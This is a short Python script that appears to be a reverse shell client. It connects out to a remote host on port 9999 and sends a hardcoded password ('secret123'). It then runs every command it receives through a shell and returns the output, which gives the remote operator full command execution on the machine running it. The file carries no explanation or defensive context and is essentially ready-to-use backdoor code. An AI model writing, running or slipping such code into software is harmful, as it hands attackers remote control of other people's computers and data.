import socket
import subprocess
import os

AUTH_PASSWORD = "secret123"

def client():
    s = socket.socket()
    host = "client ip" 
    
    port = 9999

    try:
        s.connect((host, port))
    except Exception as e:
        print("Connection failed: " + str(e))
        return

    
    prompt = s.recv(1024)
    if prompt == b"AUTH:":
        s.send(AUTH_PASSWORD.encode())
        result = s.recv(1024)
        if result != b"AUTH_SUCCESS":
            print("[-] Auth failed.")
            return

    while True:
        data = s.recv(1024)
        cmd = data.decode("utf-8").strip()

        if cmd.lower() == "quit":
            break

        if cmd.startswith("cd "):
            try:
                os.chdir(cmd[3:])
                s.send(f"Changed directory to {os.getcwd()}\n".encode())
            except Exception as e:
                s.send(f"Directory change failed: {e}\n".encode())
        else:
            try:
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                out, err = proc.communicate()
                response = (out + err).decode("utf-8", errors="ignore") + os.getcwd() + "> "
                s.send(response.encode())
            except Exception as e:
                s.send(f"Command failed: {e}".encode())

    s.close()

if __name__ == "__main__":
    client()
